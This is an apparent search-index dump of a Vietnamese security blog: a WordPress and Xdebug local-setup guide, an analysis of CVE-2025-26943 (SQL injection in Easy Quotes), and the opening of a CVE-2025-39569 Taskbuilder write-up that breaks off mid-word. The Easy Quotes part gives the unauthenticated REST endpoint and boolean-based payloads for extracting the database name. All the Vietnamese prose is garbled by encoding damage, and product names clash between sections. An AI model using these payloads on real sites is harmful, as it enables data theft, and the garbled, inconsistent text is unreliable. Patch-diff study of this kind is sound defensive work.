vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction Dá»±a trÃªn kÄ© thuáº­t boolean base ta viáº¿t script Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c.\nScript Here\nConclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u 